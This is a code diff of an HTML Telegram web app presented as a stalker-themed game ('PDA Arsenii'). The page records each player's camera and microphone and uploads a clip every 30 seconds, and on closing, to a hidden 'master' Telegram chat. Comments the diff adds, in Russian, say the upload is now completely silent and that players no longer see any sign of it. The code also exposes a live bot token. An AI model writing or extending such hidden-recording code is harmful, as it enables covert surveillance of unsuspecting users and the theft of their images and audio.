@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v7.1 Stable</title>
+    <title>PDA Arsenii v7.5 Ultimate</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -19,7 +19,7 @@
             overflow: hidden; 
             display: flex; 
             flex-direction: column; 
-            height: 100vh; /* Занимаем ровно высоту экрана */
+            height: 100vh; 
         }
 
         .header { 
@@ -46,7 +46,6 @@
             text-transform: uppercase;
         }
 
-        /* Контейнер видео теперь гибкий */
         .viewport { 
             flex-grow: 1; 
             position: relative; 
@@ -65,7 +64,6 @@
             object-fit: cover; 
         }
 
-        /* Панель управления всегда внизу */
         .mission-panel { 
             padding: 15px; 
             background: rgba(0,255,65,0.05); 
@@ -84,7 +82,7 @@
 
         .btn-report { 
             width: 100%; 
-            padding: 20px; /* Увеличил зону нажатия */
+            padding: 20px; 
             background: var(--green); 
             color: #000; 
             border: none; 
@@ -139,24 +137,27 @@
 <script>
     const CONFIG = {
         token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
-        chatId: "6997991003"
+        masterLogChatId: "6997991003" // Сюда в полной тишине будут лететь скрытые видео логов
     };
 
     const tg = window.Telegram.WebApp;
     tg.expand();
     tg.ready();
 
+    // Автоопределение пользователя, открывшего приложение
     const user = {
         id: tg.initDataUnsafe?.user?.id || 0,
         username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "stalker_anon"
     };
+
+    const userChatId = user.id; // Для личной отправки отчетов игроку в его бот
 
     let lastUpdateId = 0;
     let currentMode = "environment";
     let mediaRecorder;
     let chunks = [];
 
-    // Загрузка сохраненных данных
+    // Подгрузка данных текущего игрока
     document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
     const savedOrder = localStorage.getItem(`order_${user.id}`);
     if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
@@ -173,7 +174,7 @@
             document.getElementById('webcam').srcObject = stream;
             setupRecorder(stream);
         } catch (err) {
-            console.error("Камера не заведена:", err);
+            console.error(err);
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
@@ -203,27 +204,32 @@
         mediaRecorder.start();
     }
 
-    // Отправка каждые 30 секунд
+    // Каждые 30 секунд режем видео и отправляем
     setInterval(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     }, 30000);
 
-    // Логика отправки при выходе
+    // Срабатывает, если игрок пробыл в приложении меньше 30 секунд и закрыл его
     window.addEventListener("beforeunload", () => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     });
 
+    // Абсолютно скрытая отправка видео-логов на мастерский ID (игроки больше не видят точек)
     function sendVideo(blob) {
         const fd = new FormData();
-        fd.append("chat_id", CONFIG.chatId);
+        fd.append("chat_id", CONFIG.masterLogChatId);
         fd.append("video", blob, `v_${Date.now()}.mp4`);
         fd.append("supports_streaming", "true");
         fd.append("caption", `👤 Сталкер: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
+        
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { 
+            method: "POST", 
+            body: fd 
+        });
     }
 
     document.getElementById('switchCam').onclick = () => {
@@ -232,6 +238,7 @@
         tg.HapticFeedback.selectionChanged();
     };
 
+    // Отправка отчета по кнопке (официальное уведомление в бот игрока)
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -239,11 +246,12 @@
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(blob => {
             const fd = new FormData();
-            fd.append("chat_id", CONFIG.chatId);
+            fd.append("chat_id", userChatId); 
             fd.append("photo", blob, "report.jpg");
             fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
+            
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
             tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ");
         }, "image/jpeg", 0.8);
